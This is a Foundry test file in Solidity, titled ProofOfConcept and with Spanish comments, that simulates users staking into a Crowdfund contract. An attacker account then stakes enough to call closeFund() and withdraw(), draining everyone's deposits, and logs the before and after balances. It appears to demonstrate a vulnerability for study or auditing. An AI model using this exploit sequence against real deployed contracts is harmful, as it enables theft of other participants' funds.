// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.7.6;
pragma experimental ABIEncoderV2;

import {Test, console} from "@forge-std/Test.sol";
import {Crowdfund} from "../src/Crowdfund.sol";

contract ProofOfConcept is Test {

    Crowdfund public crowdfundContract;

    uint constant DECIMALS = 10**15;

    address public owner = makeAddr("owner");
    address public user1 = makeAddr("user1");
    address public user2 = makeAddr("user2");
    address public user3 = makeAddr("user3");
    address public user4 = makeAddr("user4");
    address public user5 = makeAddr("user5");
    address public attacker1 = makeAddr("attacker1");
    address public attacker01 = makeAddr("attacker01");

    // La función setUp() es ejecutada antes de cada test para establecer el escenario inicial
    function setUp() public {
        // Aumentamos el balance de cada usuario
        vm.deal(owner, 300 * DECIMALS);
        vm.deal(user1, 300 * DECIMALS);
        vm.deal(user2, 300 * DECIMALS);
        vm.deal(user3, 300 * DECIMALS);
        vm.deal(user4, 300 * DECIMALS);
        vm.deal(user5, 300 * DECIMALS);
        vm.deal(attacker1, 300 * DECIMALS);

        // El owner despliega el contrato
        vm.prank(owner);
        crowdfundContract = new Crowdfund();
    }


    function test_exploit() public {
        
        console.log("-------------------------------------------------------------------------------");
        console.log(unicode"\n\tLet's simulate the stake of different crowdfunding participants\n");
        console.log("-------------------------------------------------------------------------------");
        
        stake(user1, 49 * DECIMALS);
        stake(user2, 47 * DECIMALS);
        stake(user3, 50 * DECIMALS);
        stake(user4, 78 * DECIMALS);
        stake(user5, 83 * DECIMALS);
        stake(user1, 88 * DECIMALS);
        stake(user2, 87 * DECIMALS);
        stake(user3, 89 * DECIMALS);
        stake(user4, 90 * DECIMALS);
        stake(user5, 82 * DECIMALS);
        
        console.log("-------------------------------------------------------------------------------\n"); 
        console.log(unicode"| => Funds on stake (crowdfund's balance) : 👀 %s * FINNEY", crowdfundContract.getTotalStake()/(1 * DECIMALS));
        console.log(unicode"| => Attacker's balance                   : 👀 %s * FINNEY\n", address(attacker1).balance/(1 * DECIMALS));
        console.log("-------------------------------------------------------------------------------"); 

        console.log(unicode"\n\t\t\t💥💥💥💥 EXPLOITING... 💥💥💥💥\n"); 

        exploit();

        console.log("-------------------------------------------------------------------------------\n"); 
        console.log(unicode"| => Funds on stake (crowdfund's balance) : ☠  %s * FINNEY", crowdfundContract.getTotalStake()/(1 * DECIMALS));
        console.log(unicode"| => Attacker's balance                   : 💯 %s * FINNEY\n", address(attacker1).balance/(1 * DECIMALS));
        console.log("-------------------------------------------------------------------------------");             
    }
    
    function stake(address user, uint amount) internal {
        vm.prank(user);
        crowdfundContract.stake{value: amount}();
        console.log(unicode"| => Address: %s Stake: %s * DECIMALS |", address(user), amount/(1 * DECIMALS));
    }

    function exploit() internal {
        vm.startPrank(attacker1);

        crowdfundContract.stake{value: 100 * DECIMALS}();
        crowdfundContract.stake{value: 100 * DECIMALS}();
        crowdfundContract.stake{value: 57 * DECIMALS}();

        crowdfundContract.closeFund();
        crowdfundContract.withdraw();

        vm.stopPrank();
    }

}